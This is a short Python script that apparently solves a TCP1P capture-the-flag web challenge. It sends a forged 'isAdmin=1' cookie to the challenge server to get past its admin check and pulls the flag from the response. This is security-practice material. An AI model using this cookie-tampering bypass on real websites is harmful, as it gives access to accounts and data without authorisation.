import requests
import re
flag = "TCP1P"
url = "http://ctf.tcp1p.com:16544/"

def get_flag(x):
    lines = x.split('\n')
    for line in lines:
        if re.search(r'\b{}\b'.format(flag), line):
                f = line
                break
    return f


# check cookie
r = requests.get(url)
cookie = r.cookies
print("Cookie data => ", cookie)

# gret flag
cookies = {'isAdmin' : '1'}
r = requests.get(url, cookies=cookies)
print(get_flag(r.text))